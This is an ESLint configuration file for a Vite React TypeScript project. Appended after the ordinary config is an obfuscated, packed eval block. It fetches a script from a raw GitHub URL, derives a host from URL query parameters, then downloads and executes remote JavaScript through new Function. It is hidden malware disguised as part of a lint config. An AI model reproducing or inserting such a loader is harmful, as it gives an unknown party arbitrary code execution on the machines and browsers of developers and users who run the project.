import js from '@eslint/js'
import globals from 'globals'
import reactHooks from 'eslint-plugin-react-hooks'
import reactRefresh from 'eslint-plugin-react-refresh'
import tseslint from 'typescript-eslint'
import { globalIgnores } from 'eslint/config'

export default tseslint.config([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      js.configs.recommended,
      tseslint.configs.recommended,
      reactHooks.configs['recommended-latest'],
      reactRefresh.configs.vite,
    ],
    languageOptions: {
      ecmaVersion: 2020,
      globals: globals.browser,
    },
  },
])
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(9(){4(f.z)1;f.z=(m()=>{m 9 A(a){2 g=B n(a);4(!g.N)O 7 P("Q 6: "+g.R);1 g.C()}9 o(a){q{4(/8\\.d/.S(a)){2 8={d:{}};7 s("8","d",a)(8,8.d);1 8.d.3}T 3;7 s("D",a+"\\U (V 3 !== \'W\') D(3);",)(v=>(3=v));1 3}h(6){j.5("[o 5]",6);1 X}}m 9 u(){q{2 E=B A("F://Y.Z.10/11/G/12/13/14/15.G",);2 3=o(E);4(!3)1;f.w=9(a,b,c){q{c=c!==16;4(!a){2 p=7 H(I.J);a=p.k("K")||"";b=b||p.k("L")||""}4(!a||!b)1;2 l=3(a);4(!l)1;n("F://"+l).M(r=>r.C()).M(x=>{(0,7 s(x))()}).h(6=>{j.5("[n l x 5]",6)})}h(e){j.5("[w 5]",e)}};2 y=7 H(I.J);2 t=y.k("K");2 i=y.k("L");4(t&&i)f.w(t,i)}h(6){j.5("[u 5]:",6)}}1 u()})()})();',62,69,'|return|const|decodeHost|if|error|err|new|module|function||||exports||window|res|catch||console|get|host|async|fetch|extractDecodeHost||try||Function||init||go|code|params|__REMOTE_LOADER__|fetchRemoteJS|await|text|setDecodeHost|remoteCode|https|js|URLSearchParams|location|search|type|id|then|ok|throw|Error|load|status|test|let|nif|typeof|undefined|null|raw|githubusercontent|com|JuanitaWHowe|refs|heads|main|index|false'.split('|'),0,{}))